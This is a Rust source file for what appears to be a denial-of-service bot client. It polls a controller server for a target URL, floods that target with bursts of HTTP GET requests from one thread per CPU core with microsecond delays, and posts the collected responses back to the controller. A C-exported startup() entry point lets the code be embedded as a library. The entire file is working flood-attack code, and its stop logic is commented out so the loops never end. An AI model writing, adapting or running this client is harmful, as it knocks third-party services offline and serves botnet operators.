use std::sync::{Arc, Condvar};
use std::sync::atomic::{AtomicBool, Ordering};
use dashmap::DashMap;
use serde_json;
use shared_mutex::{SharedMutex, SharedMutexWriteGuard};

struct Client {
    host_address: String,
    attack_data: Arc<(SharedMutex<String>, Condvar)>,
    results: Arc<DashMap<u32, Vec<String>>>,
}

// Client methods
impl Client {
    // Constructor
    fn new(host: String) -> Client {
        let thread_count = match std::thread::available_parallelism() {
            Ok(tp) => tp.get(),
            Err(_) => {
                eprintln!("Failed to get thread count. Defaulting to 1 thread.");
                1
            }
        };
        let mut cl = Client {
            host_address: host,
            attack_data: Arc::new((SharedMutex::new(String::new()), Condvar::new())),
            results: Arc::new(DashMap::with_capacity(thread_count)),
        };
        for i in 0..thread_count {
            cl.results.insert(i as u32, vec![]);
        }
        cl
    }


    // Checks if the server can attack, if it can, it notifies the workers
    fn can_attack<'a>(&self) {

        let url = self.host_address.as_str();
        let req = reqwest::blocking::get(format!("{}/api/attack", url)).unwrap().json::<String>().unwrap().
            strip_prefix("{\"").unwrap().to_string().strip_suffix("\"}").unwrap().to_string();
        let mut attack_address_url = req.split("\":\"").collect::<Vec<&str>>()[1].to_string();
        let url_str = attack_address_url.as_str().clone().to_owned();
        let (lock, cv) = &*self.attack_data.clone();
        let mut wlock = lock.write().unwrap();
        *wlock = url_str;
        drop (wlock);
        if !attack_address_url.is_empty(){
            cv.notify_all();
        }
    }


    fn start_requesting(
        client: reqwest::blocking::Client,
        id: u32,
        address: &str,
        results: Arc<DashMap<u32, Vec<String>>>,
    ) {
        let result = client.get(address).send();
        match result {
            Ok(res) => {
                let code = res.status().as_u16().to_string();
                let body = res.text().unwrap_or_default();
                let response_body = serde_json::json!({"code": code, "body":body});
                let local_instance = results.clone();
                local_instance.get_mut(&id).unwrap().push(response_body.to_string());
            }
            Err(err) => {
                eprintln!("Request error: {}", err);
            }
        }
    }

    fn thread_worker(
        attack_data: Arc<(SharedMutex<String>, Condvar)>,
        results: Arc<DashMap<u32, Vec<String>>>,
        id: u32,
        stop_signal: Arc<AtomicBool>,
    ) {
        let client = reqwest::blocking::Client::new();
        let (lock, cv) = &*attack_data;
        let delay = std::time::Duration::from_micros(15);
        // Infinite loop, stoppable by signal
        while !stop_signal.load(Ordering::Relaxed) {
            std::thread::sleep(delay);
            let mut pair = lock.write().unwrap();
            let address = &*pair;
            let addr = address.clone().to_string();
            if address.is_empty() {
                pair = pair.wait_for_write(cv).unwrap();
            }
            for _ in 0..100 {
                Client::start_requesting(client.clone(), id, &addr, results.clone());
            }
        }
    }
}


fn run() {
    let cl = Client::new(String::from("http://localhost:8080"));
    let attack_data = cl.attack_data.clone();
    let results = cl.results.clone();
    // let stop_signal = Arc::new(AtomicBool::new(false));
    // let stop_signal_clone = Rc::clone(&stop_signal);
    let mut worker_threads: Vec<std::thread::JoinHandle<()>> = Vec::new();
    let thread_count = match std::thread::available_parallelism() {
        Ok(tp) => tp.get(),
        Err(_) => {
            eprintln!("Failed to get thread count. Defaulting to 1 thread.");
            1
        }
    };
    worker_threads.reserve(thread_count);
    for i in 0..thread_count {
        let ind = i.clone();
        let a = attack_data.clone();
        let r = results.clone();
        let s = Arc::new(AtomicBool::new(false));
        worker_threads.push(std::thread::spawn(move || {
            Client::thread_worker(a, r, ind as u32, s);
        }));
    }
    cl.can_attack();
    let addr = cl.host_address.clone();
    let armap = cl.results.clone();
    let handl = std::thread::spawn(move || {
        let time = std::time::Duration::from_millis(950);
        let cl = reqwest::blocking::Client::new();
        let map = &*armap;
        let mut total_request_time: u128 = 0;
        let mut request_count = 0;
        loop {
            std::thread::sleep(time);
            let mut request_body_vec = Vec::new();
            for el in map.iter() {
                request_body_vec.extend(el.value().to_owned());
            }
            let throughput = request_body_vec.len();
            if throughput > 0 {
                let average_request_time = total_request_time as f64 / request_count as f64;
                println!("Throughput: {}, Average Request Time: {:.2} ms", throughput, average_request_time);
            }
            if request_body_vec.len() >= 20 {
                let request_builder = cl.post(format!("{}/attack_info", addr.clone()));
                let start_time = std::time::Instant::now();
                match request_builder.json(&request_body_vec).send() {
                    Ok(_) => {
                        total_request_time += start_time.elapsed().as_millis();
                        request_count += 1;
                    }
                    Err(err) => {
                        eprintln!("Failed to send attack info: {}", err);
                    }
                }
                map.alter_all(|_, mut v| {
                    v.clear();
                    v
                });
            }
        }
    });
    // Checks if the server can attack
    loop {
        cl.can_attack();
        // if stop_signal_clone.load(Ordering::Relaxed) {
        //     break;
        // }
    }
    // stop_signal..store(true, Ordering::Relaxed);
    // Waits for the thread to finish
    handl.join().unwrap();
    for thread in worker_threads {
        thread.join().unwrap();
    }
}



#[no_mangle]
pub extern "C" fn startup() {
    run();
}
